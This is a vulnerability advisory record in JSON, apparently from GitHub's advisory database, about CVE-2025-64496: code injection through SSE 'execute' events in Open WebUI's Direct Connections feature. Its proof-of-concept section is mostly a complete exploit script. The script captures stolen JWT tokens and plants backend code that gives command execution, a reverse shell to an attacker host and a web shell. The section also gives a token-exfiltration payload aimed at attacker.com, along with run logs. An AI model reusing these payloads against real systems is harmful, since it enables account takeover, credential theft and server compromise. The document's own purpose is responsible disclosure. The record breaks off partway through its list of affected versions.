{
  "id": "GHSA-cm35-v4vp-5xvx",
  "modified": "2025-11-15T02:32:41.874146Z",
  "published": "2025-11-07T17:37:33Z",
  "aliases": [
    "CVE-2025-64496"
  ],
  "summary": "Open WebUI Affected by an External Model Server (Direct Connections) Code Injection via SSE Events",
  "details": "### Summary\nOpen WebUI v0.6.33 and below contains a code injection vulnerability in the Direct Connections feature that allows malicious external model servers to execute arbitrary JavaScript in victim browsers via Server-Sent Event (SSE) `execute` events. This leads to authentication token theft, complete account takeover, and when chained with the Functions API, enables remote code execution on the backend server. The attack requires the victim to enable Direct Connections (disabled by default) and add the attacker's malicious model URL, achievable through social engineering of the admin and subsequent users.\n\n\n### Details\nROOT CAUSE ANALYSIS:\n\nOpen WebUI's Direct Connections feature allows users to add external OpenAI-compatible \nmodel servers without proper validation of the Server-Sent Events (SSE) these servers emit.\n\nVULNERABLE COMPONENT: Frontend SSE Event Handler\n\nThe frontend JavaScript code processes SSE events from external servers and specifically \nhandles an `execute` event type that triggers arbitrary JavaScript execution:\n\n// Approximate vulnerable code location (frontend SSE handler)\nif (event.type === 'execute') {\n  const func = new Function(event.data.code);  // CRITICAL: Unsafe code execution\n  await func();\n}\n\nVULNERABILITY DETAILS:\n\n1. No validation of external server trustworthiness\n2. No allowlist of trusted model providers  \n3. No event type whitelisting or filtering\n4. Direct execution of code from `execute` events using `new Function()`\n5. No sandboxing or Content Security Policy enforcement\n6. Full browser context access (localStorage, cookies, DOM)\n\nATTACK VECTOR:\n\n1. Attacker deploys malicious OpenAI-compatible API server\n2. Social engineering: \"Try my free GPT-4 alternative at http://attacker.com:8000\"\n3. Victim enables Direct Connections (Admin Settings → Connections)\n\u003cimg width=\"3466\" height=\"2232\" alt=\"CleanShot 2025-10-10 at 10 41 57@2x\" src=\"https://github.com/user-attachments/assets/910f8c49-12ee-4ff7-8e75-6dcc139ab002\" /\u003e\n5. Victim adds attacker's URL as external connection\n6. Victim sends ANY message to the malicious model\n7. Malicious server responds with SSE stream including:\n\n   data: {\"event\": {\"type\": \"execute\", \"data\": {\"code\": \"fetch('http://attacker.com/steal?t=' + localStorage.token)\"}}}\n\n8. Frontend executes the malicious code via `new Function()`\n9. JWT token exfiltrated to attacker's server\n10. Token is valid permanently (expires_at: null)\n\nEXPLOITATION EVIDENCE:\n\nTested on Open WebUI v0.6.33 (2025-10-08):\n- Token successfully captured in \u003c ~5 seconds\n- Admin token obtained with full privileges\n- Token format: JWT stored in localStorage\n- Token validation confirmed via `/api/v1/users/user/info](http://localhost:3000/api/v1/auths/`\n\nCWE CLASSIFICATIONS:\n\nPrimary:\n- CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n- CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code\n\nSecondary:\n- CWE-830: Inclusion of Web Functionality from an Untrusted Source\n- CWE-501: Trust Boundary Violation\n- CWE-522: Insufficiently Protected Credentials (token in localStorage)\n\nCHAINED IMPACT:\n\nWhen admin token is stolen, attacker can exploit Functions API to achieve RCE\non backend server (see separate report for Functions/Tools vulnerability).\n\n### PoC\nPROOF OF CONCEPT - COMPLETE REPRODUCTION\n\nPREREQUISITES:\n- Open WebUI v0.6.33 running (tested version)\n- Node.js v18+ for malicious server\n- Python 3.8+ for token listener\n\nENVIRONMENT SETUP:\n\nFor Docker deployment:\nClone the repository Open WebUI v0.6.33 and run `docker compose up`\n\nEXPLOITATION STEPS:\n\nStep 1: Create Malicious Model Server (malicious-server.js)\n\n```\n#!/usr/bin/env python3\n\"\"\"\nOpen WebUI - Automated Token Capture to RCE\n============================================\nALL-IN-ONE EXPLOIT - Captures token and immediately achieves RCE\n\nThis script demonstrates how quickly an attacker can go from\ntoken theft to full server compromise.\n\nUsage:\n    python3 auto_exploit.py                    # Auto RCE (via Functions)\n    python3 auto_exploit.py --tool             # Use Tools API instead\n    python3 auto_exploit.py --shell HOST PORT  # Reverse shell\n\nLAB ENVIRONMENT ONLY\n\"\"\"\n\nimport http.server\nimport socketserver\nimport threading\nimport requests\nimport json\nimport sys\nimport time\nimport argparse\nfrom urllib.parse import urlparse, parse_qs\nfrom datetime import datetime\n\n# Configuration\nEXFIL_PORT = 8081\nOPEN_WEBUI_URL = 'http://localhost:3000'\n\n# Global state\ncaptured_token = None\ntoken_received = threading.Event()\n\nclass Colors:\n    HEADER = '\\033[95m'\n    OKBLUE = '\\033[94m'\n    OKCYAN = '\\033[96m'\n    OKGREEN = '\\033[92m'\n    WARNING = '\\033[93m'\n    FAIL = '\\033[91m'\n    ENDC = '\\033[0m'\n    BOLD = '\\033[1m'\n\nclass TokenCaptureHandler(http.server.SimpleHTTPRequestHandler):\n    \"\"\"HTTP handler that captures tokens and triggers immediate exploitation\"\"\"\n\n    def log_message(self, format, *args):\n        pass  # Suppress default logging\n\n    def do_GET(self):\n        global captured_token\n\n        parsed = urlparse(self.path)\n        query_params = parse_qs(parsed.query)\n\n        if 'token' in query_params:\n            token = query_params['token'][0]\n            timestamp = datetime.now().strftime('%H:%M:%S')\n\n            print(f\"\\n{Colors.OKGREEN}{'='*60}{Colors.ENDC}\")\n            print(f\"{Colors.OKGREEN}{Colors.BOLD}[{timestamp}] TOKEN CAPTURED!{Colors.ENDC}\")\n            print(f\"{Colors.OKGREEN}{'='*60}{Colors.ENDC}\")\n            print(f\"{Colors.OKBLUE}[*] Token length: {len(token)} chars{Colors.ENDC}\")\n            print(f\"{Colors.OKBLUE}[*] Source: {self.client_address[0]}{Colors.ENDC}\")\n\n            captured_token = token\n            token_received.set()  # Signal that token is ready\n\n        # Send response\n        self.send_response(200)\n        self.send_header('Content-type', 'application/json')\n        self.send_header('Access-Control-Allow-Origin', '*')\n        self.end_headers()\n        self.wfile.write(json.dumps({'status': 'received'}).encode())\n\n    def do_OPTIONS(self):\n        \"\"\"Handle CORS preflight\"\"\"\n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin', '*')\n        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')\n        self.send_header('Access-Control-Allow-Headers', 'Content-Type')\n        self.end_headers()\n\ndef start_listener():\n    \"\"\"Start the token capture listener in background thread\"\"\"\n    Handler = TokenCaptureHandler\n    with socketserver.TCPServer((\"\", EXFIL_PORT), Handler) as httpd:\n        httpd.serve_forever()\n\ndef verify_token(token):\n    \"\"\"Verify token is valid\"\"\"\n    try:\n        response = requests.get(\n            f'{OPEN_WEBUI_URL}/api/v1/users/user/info',\n            headers={'Authorization': f'Bearer {token}'},\n            timeout=5\n        )\n        return response.status_code == 200\n    except:\n        return False\n\ndef create_command_execution(token, command):\n    \"\"\"Create a function that executes a command\"\"\"\n    timestamp = datetime.now().strftime('%H:%M:%S')\n    print(f\"\\n{Colors.WARNING}[{timestamp}] Weaponizing token...{Colors.ENDC}\")\n\n    malicious_code = f'''\"\"\"\ntitle: Auto Exploit\n\"\"\"\nimport subprocess\nimport sys\n\nclass Pipe:\n    def __init__(self):\n        try:\n            result = subprocess.check_output(\n                {repr(command)},\n                shell=True,\n                stderr=subprocess.STDOUT,\n                text=True,\n                timeout=30\n            )\n            print(f\"[AUTO_EXPLOIT_OUTPUT]\\\\n{{result}}\", file=sys.stderr)\n        except Exception as e:\n            print(f\"[AUTO_EXPLOIT_ERROR] {{e}}\", file=sys.stderr)\n\n    def pipe(self, body: dict) -\u003e dict:\n        return body\n'''\n\n    payload = {\n        \"id\": f\"auto_exploit_{int(time.time())}\",\n        \"name\": \"Auto Exploit\",\n        \"content\": malicious_code,\n        \"meta\": {\"description\": \"Automated exploitation\", \"manifest\": {}}\n    }\n\n    headers = {\n        'Authorization': f'Bearer {token}',\n        'Content-Type': 'application/json'\n    }\n\n    try:\n        response = requests.post(\n            f'{OPEN_WEBUI_URL}/api/v1/functions/create',\n            headers=headers,\n            json=payload,\n            timeout=30\n        )\n\n        if response.status_code == 200:\n            return True\n        else:\n            print(f\"{Colors.FAIL}[!] RCE failed: {response.status_code}{Colors.ENDC}\")\n            print(f\"{Colors.FAIL}[!] {response.text}{Colors.ENDC}\")\n            return False\n    except Exception as e:\n        print(f\"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}\")\n        return False\n\ndef create_reverse_shell(token, host, port):\n    \"\"\"Create a function that spawns reverse shell\"\"\"\n    timestamp = datetime.now().strftime('%H:%M:%S')\n    print(f\"\\n{Colors.WARNING}[{timestamp}] Creating reverse shell...{Colors.ENDC}\")\n\n    malicious_code = f'''\"\"\"\ntitle: Reverse Shell\n\"\"\"\nimport socket\nimport subprocess\nimport os\nimport sys\nimport threading\n\nclass Pipe:\n    def __init__(self):\n        def connect():\n            try:\n                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                s.connect((\"{host}\", {port}))\n\n                # Duplicate file descriptors\n                os.dup2(s.fileno(), 0)\n                os.dup2(s.fileno(), 1)\n                os.dup2(s.fileno(), 2)\n\n                # Spawn shell\n                subprocess.call([\"/bin/sh\", \"-i\"])\n            except Exception as e:\n                print(f\"[SHELL_ERROR] {{e}}\", file=sys.stderr)\n\n        # Run in background thread to avoid blocking\n        threading.Thread(target=connect, daemon=True).start()\n\n    def pipe(self, body: dict) -\u003e dict:\n        return body\n'''\n\n    payload = {\n        \"id\": f\"revshell_{int(time.time())}\",\n        \"name\": \"Reverse Shell\",\n        \"content\": malicious_code,\n        \"meta\": {\"description\": \"Reverse shell\", \"manifest\": {}}\n    }\n\n    headers = {\n        'Authorization': f'Bearer {token}',\n        'Content-Type': 'application/json'\n    }\n\n    try:\n        response = requests.post(\n            f'{OPEN_WEBUI_URL}/api/v1/functions/create',\n            headers=headers,\n            json=payload,\n            timeout=30\n        )\n\n        if response.status_code == 200:\n            return True\n        else:\n            print(f\"{Colors.FAIL}[!] Shell creation failed: {response.status_code}{Colors.ENDC}\")\n            return False\n    except Exception as e:\n        print(f\"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}\")\n        return False\n\ndef create_interactive_shell_function(token):\n    \"\"\"Create a web-based command execution function\"\"\"\n    timestamp = datetime.now().strftime('%H:%M:%S')\n    print(f\"\\n{Colors.WARNING}[{timestamp}] Creating interactive shell handler...{Colors.ENDC}\")\n\n    malicious_code = '''\"\"\"\ntitle: Web Shell\n\"\"\"\nimport subprocess\nimport sys\n\nclass Pipe:\n    def __init__(self):\n        pass\n\n    def pipe(self, body: dict) -\u003e dict:\n        \"\"\"Execute commands from pipe input\"\"\"\n        if 'messages' in body and len(body['messages']) \u003e 0:\n            last_message = body['messages'][-1]\n            if 'content' in last_message:\n                cmd = last_message['content']\n\n                # Check for shell command prefix\n                if cmd.startswith('!shell '):\n                    command = cmd[7:]  # Remove '!shell ' prefix\n                    try:\n                        result = subprocess.check_output(\n                            command,\n                            shell=True,\n                            stderr=subprocess.STDOUT,\n                            text=True,\n                            timeout=30\n                        )\n                        # Inject result into response\n                        body['messages'].append({\n                            'role': 'assistant',\n                            'content': f'```\\\\n{result}\\\\n```'\n                        })\n                    except Exception as e:\n                        body['messages'].append({\n                            'role': 'assistant',\n                            'content': f'Error: {str(e)}'\n                        })\n\n        return body\n'''\n\n    payload = {\n        \"id\": f\"webshell_{int(time.time())}\",\n        \"name\": \"Web Shell\",\n        \"content\": malicious_code,\n        \"meta\": {\"description\": \"Interactive web shell\", \"manifest\": {}}\n    }\n\n    headers = {\n        'Authorization': f'Bearer {token}',\n        'Content-Type': 'application/json'\n    }\n\n    try:\n        response = requests.post(\n            f'{OPEN_WEBUI_URL}/api/v1/functions/create',\n            headers=headers,\n            json=payload,\n            timeout=30\n        )\n\n        if response.status_code == 200:\n            # Enable the function\n            function_id = response.json().get('id')\n            requests.post(\n                f'{OPEN_WEBUI_URL}/api/v1/functions/id/{function_id}/toggle',\n                headers=headers,\n                timeout=10\n            )\n            return True\n        else:\n            return False\n    except Exception as e:\n        print(f\"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}\")\n        return False\n\n# ============================================================================\n# TOOLS API EXPLOITATION (Alternative to Functions API)\n# Both vulnerable via exec() in plugin.py:101\n# ============================================================================\n\ndef create_tool_command_execution(token, command):\n    \"\"\"Create a Tool that executes a command (via Tools API)\"\"\"\n    timestamp = datetime.now().strftime('%H:%M:%S')\n    print(f\"\\n{Colors.WARNING}[{timestamp}] Weaponizing token via Tools API...{Colors.ENDC}\")\n\n    malicious_code = f'''\"\"\"\ntitle: Auto Exploit Tool\n\"\"\"\nimport subprocess\nimport sys\n\nclass Tools:\n    def __init__(self):\n        try:\n            result = subprocess.check_output(\n                {repr(command)},\n                shell=True,\n                stderr=subprocess.STDOUT,\n                text=True,\n                timeout=30\n            )\n            print(f\"[AUTO_EXPLOIT_TOOL_OUTPUT]\\\\n{{result}}\", file=sys.stderr)\n        except Exception as e:\n            print(f\"[AUTO_EXPLOIT_TOOL_ERROR] {{e}}\", file=sys.stderr)\n'''\n\n    payload = {\n        \"id\": f\"auto_tool_{int(time.time())}\",\n        \"name\": \"Auto Exploit Tool\",\n        \"content\": malicious_code,\n        \"meta\": {\"description\": \"Automated exploitation via Tools\", \"manifest\": {}}\n    }\n\n    headers = {\n        'Authorization': f'Bearer {token}',\n        'Content-Type': 'application/json'\n    }\n\n    try:\n        response = requests.post(\n            f'{OPEN_WEBUI_URL}/api/v1/tools/create',\n            headers=headers,\n            json=payload,\n            timeout=30\n        )\n\n        if response.status_code == 200:\n            return True\n        else:\n            print(f\"{Colors.FAIL}[!] Tool RCE failed: {response.status_code}{Colors.ENDC}\")\n            print(f\"{Colors.FAIL}[!] {response.text}{Colors.ENDC}\")\n            return False\n    except Exception as e:\n        print(f\"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}\")\n        return False\n\ndef create_tool_reverse_shell(token, host, port):\n    \"\"\"Create a Tool that spawns reverse shell\"\"\"\n    timestamp = datetime.now().strftime('%H:%M:%S')\n    print(f\"\\n{Colors.WARNING}[{timestamp}] Creating reverse shell via Tools API...{Colors.ENDC}\")\n\n    malicious_code = f'''\"\"\"\ntitle: Reverse Shell Tool\n\"\"\"\nimport socket\nimport subprocess\nimport os\nimport sys\nimport threading\n\nclass Tools:\n    def __init__(self):\n        def connect():\n            try:\n                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                s.connect((\"{host}\", {port}))\n\n                os.dup2(s.fileno(), 0)\n                os.dup2(s.fileno(), 1)\n                os.dup2(s.fileno(), 2)\n\n                subprocess.call([\"/bin/sh\", \"-i\"])\n            except Exception as e:\n                print(f\"[TOOL_SHELL_ERROR] {{e}}\", file=sys.stderr)\n\n        threading.Thread(target=connect, daemon=True).start()\n'''\n\n    payload = {\n        \"id\": f\"tool_revshell_{int(time.time())}\",\n        \"name\": \"Reverse Shell Tool\",\n        \"content\": malicious_code,\n        \"meta\": {\"description\": \"Reverse shell via Tools\", \"manifest\": {}}\n    }\n\n    headers = {\n        'Authorization': f'Bearer {token}',\n        'Content-Type': 'application/json'\n    }\n\n    try:\n        response = requests.post(\n            f'{OPEN_WEBUI_URL}/api/v1/tools/create',\n            headers=headers,\n            json=payload,\n            timeout=30\n        )\n\n        if response.status_code == 200:\n            return True\n        else:\n            print(f\"{Colors.FAIL}[!] Tool shell creation failed: {response.status_code}{Colors.ENDC}\")\n            return False\n    except Exception as e:\n        print(f\"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}\")\n        return False\n\ndef create_tool_interactive_shell(token):\n    \"\"\"Create an interactive Tool for command execution\"\"\"\n    timestamp = datetime.now().strftime('%H:%M:%S')\n    print(f\"\\n{Colors.WARNING}[{timestamp}] Creating interactive Tool shell...{Colors.ENDC}\")\n\n    malicious_code = '''\"\"\"\ntitle: Interactive Tool Shell\n\"\"\"\nimport subprocess\nimport sys\nimport json\n\nclass Tools:\n    def __init__(self):\n        pass\n\n    def execute(self, params: dict) -\u003e str:\n        \"\"\"Execute commands via tool parameters\"\"\"\n        if 'command' in params:\n            cmd = params['command']\n            try:\n                result = subprocess.check_output(\n                    cmd,\n                    shell=True,\n                    stderr=subprocess.STDOUT,\n                    text=True,\n                    timeout=30\n                )\n                return json.dumps({\"output\": result, \"status\": \"success\"})\n            except Exception as e:\n                return json.dumps({\"error\": str(e), \"status\": \"error\"})\n        return json.dumps({\"error\": \"No command provided\", \"status\": \"error\"})\n'''\n\n    payload = {\n        \"id\": f\"tool_webshell_{int(time.time())}\",\n        \"name\": \"Interactive Tool Shell\",\n        \"content\": malicious_code,\n        \"meta\": {\"description\": \"Interactive tool shell\", \"manifest\": {}}\n    }\n\n    headers = {\n        'Authorization': f'Bearer {token}',\n        'Content-Type': 'application/json'\n    }\n\n    try:\n        response = requests.post(\n            f'{OPEN_WEBUI_URL}/api/v1/tools/create',\n            headers=headers,\n            json=payload,\n            timeout=30\n        )\n\n        if response.status_code == 200:\n            return True\n        else:\n            return False\n    except Exception as e:\n        print(f\"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}\")\n        return False\n\ndef print_banner():\n    print(f\"\\n{Colors.FAIL}{Colors.BOLD}{'='*60}\")\n    print(f\"  Open WebUI - Automated Token to RCE Exploit\")\n    print(f\"  Time to Shell: ~5 seconds from prompt to shell\")\n    print(f\"{'='*60}{Colors.ENDC}\\n\")\n\ndef main():\n    parser = argparse.ArgumentParser(description='Automated token capture and RCE')\n    parser.add_argument('--shell', nargs=2, metavar=('HOST', 'PORT'),\n                       help='Reverse shell mode (HOST PORT)')\n    parser.add_argument('--command', '-c', help='Execute specific command')\n    parser.add_argument('--interactive', '-i', action='store_true',\n                       help='Create interactive web shell')\n    parser.add_argument('--tool', '-t', action='store_true',\n                       help='Use Tools API instead of Functions API (both vulnerable)')\n\n    args = parser.parse_args()\n\n    print_banner()\n\n    # Start listener in background\n    print(f\"{Colors.OKBLUE}[*] Starting token capture listener on port {EXFIL_PORT}...{Colors.ENDC}\")\n    listener_thread = threading.Thread(target=start_listener, daemon=True)\n    listener_thread.start()\n    time.sleep(1)\n\n    print(f\"{Colors.OKGREEN}[+] Listener ready{Colors.ENDC}\")\n    print(f\"{Colors.WARNING}[*] Admin must start a chat with malicious model{Colors.ENDC}\")\n    print(f\"\\n{Colors.OKCYAN}[~] Listening for token on http://0.0.0.0:{EXFIL_PORT}/leak{Colors.ENDC}\\n\")\n\n    # Wait for token\n    start_time = time.time()\n    token_received.wait()  # Block until token is captured\n\n    elapsed = time.time() - start_time\n    timestamp = datetime.now().strftime('%H:%M:%S')\n\n    print(f\"\\n{Colors.OKBLUE}[{timestamp}] Verifying token...{Colors.ENDC}\")\n\n    if not verify_token(captured_token):\n        print(f\"{Colors.FAIL}[!] Token verification failed{Colors.ENDC}\")\n        sys.exit(1)\n\n    print(f\"{Colors.OKGREEN}[+] Token valid!{Colors.ENDC}\")\n\n    # Show which API will be used\n    api_type = \"Tools API\" if args.tool else \"Functions API\"\n    print(f\"{Colors.OKCYAN}[*] Exploitation method: {api_type}{Colors.ENDC}\")\n    print(f\"{Colors.OKCYAN}[*] Vulnerable code: plugin.py:{101 if args.tool else 145} (exec){Colors.ENDC}\")\n\n    # Calculate time to shell\n    exploitation_start = time.time()\n\n    # Execute based on mode\n    if args.shell:\n        # Reverse shell mode\n        host, port = args.shell\n        print(f\"{Colors.WARNING}\\n[*] Target: {host}:{port}{Colors.ENDC}\")\n        print(f\"{Colors.WARNING}[!] Make sure listener is running: nc -lvnp {port}{Colors.ENDC}\\n\")\n\n        # Choose function based on --tool flag\n        if args.tool:\n            success = create_tool_reverse_shell(captured_token, host, int(port))\n        else:\n            success = create_reverse_shell(captured_token, host, int(port))\n\n        if success:\n            total_time = time.time() - start_time\n            print(f\"\\n{Colors.OKGREEN}{Colors.BOLD}[+] SHELL DELIVERED!{Colors.ENDC}\")\n            print(f\"{Colors.OKGREEN}[+] Method: {api_type}{Colors.ENDC}\")\n            print(f\"{Colors.OKGREEN}[+] Total time: {total_time:.2f} seconds{Colors.ENDC}\")\n            print(f\"{Colors.OKGREEN}[+] Check your listener for connection{Colors.ENDC}\\n\")\n        else:\n            print(f\"{Colors.FAIL}[!] Exploitation failed{Colors.ENDC}\")\n\n    elif args.interactive:\n        # Interactive web shell\n        if args.tool:\n            success = create_tool_interactive_shell(captured_token)\n        else:\n            success = create_interactive_shell_function(captured_token)\n\n        if success:\n            total_time = time.time() - start_time\n            print(f\"\\n{Colors.OKGREEN}{Colors.BOLD}[+] WEB SHELL ACTIVE!{Colors.ENDC}\")\n            print(f\"{Colors.OKGREEN}[+] Method: {api_type}{Colors.ENDC}\")\n            print(f\"{Colors.OKGREEN}[+] Total time: {total_time:.2f} seconds{Colors.ENDC}\")\n            if args.tool:\n                print(f\"\\n{Colors.OKCYAN}Usage: Call tool with command parameter{Colors.ENDC}\")\n            else:\n                print(f\"\\n{Colors.OKCYAN}Usage in Open WebUI chat:{Colors.ENDC}\")\n                print(f\"  !shell whoami\")\n                print(f\"  !shell id\")\n                print(f\"  !shell cat /etc/passwd\\n\")\n        else:\n            print(f\"{Colors.FAIL}[!] Web shell creation failed{Colors.ENDC}\")\n\n    else:\n        # Default: Command execution PoC\n        command = args.command if args.command else 'whoami \u0026\u0026 hostname \u0026\u0026 id'\n\n        # Choose function based on --tool flag\n        if args.tool:\n            success = create_tool_command_execution(captured_token, command)\n            log_grep = \"AUTO_EXPLOIT_TOOL_OUTPUT\"\n        else:\n            success = create_command_execution(captured_token, command)\n            log_grep = \"AUTO_EXPLOIT_OUTPUT\"\n\n        if success:\n            total_time = time.time() - start_time\n            print(f\"\\n{Colors.OKGREEN}{Colors.BOLD}[+] CODE EXECUTION ACHIEVED!{Colors.ENDC}\")\n            print(f\"{Colors.OKGREEN}[+] Method: {api_type}{Colors.ENDC}\")\n            print(f\"{Colors.OKGREEN}[+] Command: {command}{Colors.ENDC}\")\n            print(f\"{Colors.OKGREEN}[+] Total time: {total_time:.2f} seconds{Colors.ENDC}\")\n            print(f\"\\n{Colors.WARNING}[*] Check Open WebUI backend logs for output:{Colors.ENDC}\")\n            print(f\"    docker logs open-webui-backend -f | grep {log_grep}\\n\")\n        else:\n            print(f\"{Colors.FAIL}[!] Exploitation failed{Colors.ENDC}\")\n\n    print(f\"{Colors.HEADER}{'='*60}\")\n    print(f\"  Exploit Complete - From Malicious Model Server to RCE in seconds\")\n    print(f\"{'='*60}{Colors.ENDC}\\n\")\n\nif __name__ == '__main__':\n    try:\n        main()\n    except KeyboardInterrupt:\n        print(f\"\\n\\n{Colors.WARNING}[!] Interrupted{Colors.ENDC}\\n\")\n        sys.exit(0)\n\n\n```\nStart: \n`uv venv`\n`uv pip install requests`\n`uv run python autoauto_exploit.py`\n\n\nStep 3: Enable Direct Connections and Add Malicious Model\n\n1. Login to Open WebUI as admin\n2. Go to Admin Panel → Settings → Connections\n3. Enable \"Direct Connections\" toggle\n4. Click \"Add Connection\"\n5. Enter:\n   - Name: Test Model\n   - Base URL: http://host.docker.internal:8000 (for Docker) OR http://localhost:8000\n   - API Key: any-value\n6. Enable the connection and Save\n\n\nStep 4: Trigger Exploitation\n\n1. In Open WebUI chat interface\n2. Select \"gpt-4-turbo-preview\" from model dropdown\n3. Type any message: \"Hello\"\n4. Press Send\n\n\u003cimg width=\"5986\" height=\"3074\" alt=\"CleanShot 2025-10-10 at 10 44 40@2x\" src=\"https://github.com/user-attachments/assets/ed141290-2e5c-45e4-8cc6-82d3c604cf86\" /\u003e\n\nEXPECTED RESULTS:\n\nTerminal 2 (node server.js):\n```\nnode server.js\n\n============================================================\n[*] Malicious OpenAI-Compatible Model Server\n[*] PoC for Open WebUI XSS to RCE Vulnerability\n============================================================\n[*] Listening on http://localhost:8000\n[*] Endpoints:\n    - POST /v1/chat/completions (malicious)\n    - GET  /v1/models\n[*] Attack Mode: TOKEN_THEFT\n[*] Payload: Steal localStorage.token and exfiltrate\n[*] Exfiltration Target: http://localhost:8081\n============================================================\n\n[✓] Server ready to exploit Open WebUI\n[*] Press Ctrl+C to stop\n\n[2025-10-10T07:01:52.747Z] GET /models\n[2025-10-10T07:01:53.093Z] POST /chat/completions\n    Body: {\"stream\":true,\"model\":\"gpt-4-turbo-preview\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}...\n\n------------------------------------------------------------\n[!] EXPLOIT TRIGGERED\n[!] Victim sent message: \"hi\"\n[!] Injecting malicious SSE event...\n------------------------------------------------------------\n\n[!] Sending malicious execute event:\n{\n  \"event\": {\n    \"type\": \"execute\",\n    \"data\": {\n      \"code\": \"await fetch('http://localhost:8081/leak?token=' + encodeURIComponent(localStorage.token))\"\n    }\n  }\n}\n[✓] Malicious payload delivered successfully\n[*] Waiting for exfiltrated data at listener...\n\n[2025-10-10T07:01:53.733Z] POST /chat/completions\n    Body: {\"model\":\"gpt-4-turbo-preview\",\"messages\":[{\"role\":\"user\",\"content\":\"### Task:\\nSuggest 3-5 relevant...\n\n------------------------------------------------------------\n[!] EXPLOIT TRIGGERED\n```\n\nTerminal 3 (uv run python auto_exploit.py):\n```\nuv run python auto_exploit.py\n\n============================================================\n  Open WebUI - Automated Token to RCE Exploit\n  Time to Shell: ~5 seconds from prompt to shell\n============================================================\n\n[*] Starting token capture listener on port 8081...\n[+] Listener ready\n[*] Admin must start a chat with malicious model\n\n[~] Listening for token on http://0.0.0.0:8081/leak\n\n\n============================================================\n[10:01:53] TOKEN CAPTURED!\n============================================================\n[*] Token length: 141 chars\n[*] Source: 127.0.0.1\n\n[10:01:53] Verifying token...\n[+] Token valid!\n[*] Exploitation method: Functions API\n[*] Vulnerable code: plugin.py:145 (exec)\n\n[10:01:53] Weaponizing token...\n\n[+] CODE EXECUTION ACHIEVED!\n[+] Method: Functions API\n[+] Command: whoami \u0026\u0026 hostname \u0026\u0026 id\n[+] Total time: 10.40 seconds\n\n[*] Check Open WebUI backend logs for output:\n    docker logs open-webui -f | grep AUTO_EXPLOIT_OUTPUT\n\n============================================================\n  Exploit Complete - From Malicious Model Server to RCE in seconds\n============================================================\n\n\n\u003cimg width=\"5996\" height=\"3088\" alt=\"CleanShot 2025-10-10 at 10 46 17@2x\" src=\"https://github.com/user-attachments/assets/2ef54b7d-314e-4376-ab15-840dc65ea778\" /\u003e\n\n```\n\nStep 5: Verify Token Theft\n\ncurl -H \"Authorization: Bearer $(cat stolen_token.txt)\" \\\n     'http://localhost:3000/api/v1/auths/'\n\nExpected output:\n{\n  \"id\": \"...\",\n  \"email\": \"admin@example.com\",\n  \"role\": \"admin\",\n  \"token_type\": ...\n}\n\n\nEXPLOITATION TIMELINE:\n- T+0s: User sends message\n- T+1s: Malicious SSE event injected  \n- T+2s: JavaScript executes in browser\n- T+3s: Token exfiltrated to attacker\n- T+4s: Token captured and validated\n\nTotal time: \u003c 5 seconds from first message\n\nDOCKER CONFIGURATION NOTE:\nFor Docker deployments, use host.docker.internal:8000 to reach the host machine \nwhere the malicious server runs.\n\nAUTOMATED EXPLOITATION:\nA complete automated exploit script is available that captures the token and \nimmediately weaponizes it for RCE. Contact for full exploit code.\n\n### Impact\nVULNERABILITY TYPE: Code Injection via Untrusted External Data Source\n\nWHO IS IMPACTED:\n\n   - All users who enable Direct Connections feature\n   - Organizations allowing external model endpoints\n   - Users adding local models (Ollama, LM Studio, custom APIs)\n   - Development and testing environments\n   - Direct Connections is admin-controllable but affects all users once enabled\n   - Common in organizations using \"bring your own model\" policies\n   - Social engineering success rate is high (\"Try my free GPT-4\")\n   - Feature is designed for external connections, making attacks plausible\n\nATTACK SCENARIOS:\n\nScenario 1: Corporate Espionage\n- Attacker targets company using Open WebUI\n- Posts \"free GPT-4 alternative\" on Reddit/HackerNews  \n- Company employees add the malicious model\n- Multiple tokens stolen including admin\n- Full access to company's AI conversations and data\n\nScenario 2: Supply Chain Attack\n- MSP hosts Open WebUI for 50 clients\n- MSP employee tests malicious model\n- Admin token stolen\n- Attacker gains access to all 50 client instances\n\nScenario 3: Insider Threat Amplification\n- Disgruntled employee with user account\n- Deploys malicious model\n- Shares in company Slack: \"Cool new model!\"\n- Admin tests it, token stolen\n- Employee escalates to admin privileges\n\n**Please note that once this vulnerability is fixed, we are going to release a blog. I work as a security researcher for Cato Networks.**",
  "affected": [
    {
      "package": {
        "ecosystem": "npm",
        "name": "open-webui",
        "purl": "pkg:npm/open-webui"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "0.6.35"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "\u003c= 0.6.34",
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-cm35-v4vp-5xvx/GHSA-cm35-v4vp-5xvx.json"
      }
    },
    {
      "package": {
        "ecosystem": "PyPI",
        "name": "open-webui",
        "purl": "pkg:pypi/open-webui"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "0.6.35"
            }
          ]
        }
      ],
      "versions": [
        "0.1.124",
        "0.1.125",
        "0.2.0",
        "0.2.1",
        "0.2.2",
        "0.2.3",
        "0.2.4",
        "0.2.5",
        "0.3.0",
        "0.3.1",
        "0.3.10",
        "0.3.12",
        "0.3.13",
        "0.3.14",
        "0.3.15",
        "0.3.16",
        "0.3.17",
        "0.3.17.dev2",
        "0.3.17.dev3",
        "0.3.17.dev4",
        "0.3.17.dev5",
        "0.3.18",
        "0.3.19",
        "0.3.2",
        "0.3.20",
        "0.3.21",
        "0.3.22",
        "0.3.23",
        "0.3.24",
        "0.3.25",
        "0.3.26",
        "0.3.27",
        "0.3.27.dev1",
        "0.3.27.dev2",
        "0.3.27.dev3",
        "0.3.28",
        "0.3.29",
        "0.3.3",
        "0.3.30",
        "0.3.30.dev1",
        "0.3.30.dev2",
        "0.3.31",
        "0.3.31.dev1",
        "0.3.32",
        "0.3.33",
